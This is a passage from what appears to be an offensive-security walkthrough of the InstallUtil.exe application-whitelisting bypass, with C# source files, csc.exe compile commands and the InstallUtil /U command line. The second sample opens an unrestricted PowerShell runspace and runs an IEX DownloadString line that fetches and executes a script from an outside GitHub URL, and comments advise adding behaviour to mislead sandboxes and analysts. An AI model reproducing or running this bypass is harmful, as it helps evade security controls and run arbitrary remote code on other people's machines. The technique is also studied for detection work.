using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

public class Program
{
                public static void Main()
                {
                                Console.WriteLine("Hey There From Main()");
                                //Add any behaviour here to throw off sandbox execution/analysts :)
                                //These binaries can exhibit one behavior when executed in sandbox, and entirely different one when invoked 
                                //by InstallUtil.exe
                                
                }
                
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
                //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
                public override void Uninstall(System.Collections.IDictionary savedState)
                {
                
                                Console.WriteLine("Hello There From Uninstall, If you are reading this, prevention has failed.");
                                
                }
                
}

2. Compile the file. Examples below.

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:InstallUtilBypass1.exe InstallUtilBypass1.cs
C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /out:InstallUtilBypass1.exe InstallUtilBypass1.cs

3. Run the command:

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U /logfile= /logtoconsole=false InstallUtilBypass1.exe

Instructions: Run PowerShell

1. Create the follow InstallUtilBypass2.cs file based on the code below. This will run arbitrary PowerShell through the .exe file.

using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.EnterpriseServices;              
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;             
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

public class Program
{
                public static void Main()
                {
                                Console.WriteLine("Hey There From Main()");
                                //Add any behavior here to throw off sandbox execution/analysts :)
                                //These binaries can exhibit one behavior when executed in sandbox, and entirely different one when invoked 
                                //by InstallUtil.exe
                                Console.WriteLine("Hello from mail.");
                                
                }
                
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
                //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
                public override void Uninstall(System.Collections.IDictionary savedState)
                {
                
                    InitialSessionState iss = InitialSessionState.CreateDefault();
                    iss.LanguageMode = PSLanguageMode.FullLanguage;
                    Runspace runspace = RunspaceFactory.CreateRunspace(iss);
                    runspace.Open();
                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
                    Pipeline pipeline = runspace.CreatePipeline();
                     
                    //Interrogate LockDownPolicy
                    //Console.WriteLine(System.Management.Automation.Security.SystemPolicy.GetSystemLockdownPolicy());                
                     
                    //Add commands
                    pipeline.Commands.AddScript("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/runme2.ps1')");

                    //Prep PS for string output and invoke
                    //pipeline.Commands.Add("Out-String");
                    Collection<PSObject> results = pipeline.Invoke();
                    runspace.Close();
                    Console.WriteLine("Hello There From Uninstall, If you are reading this, prevention has failed.");
                                
                }               
}
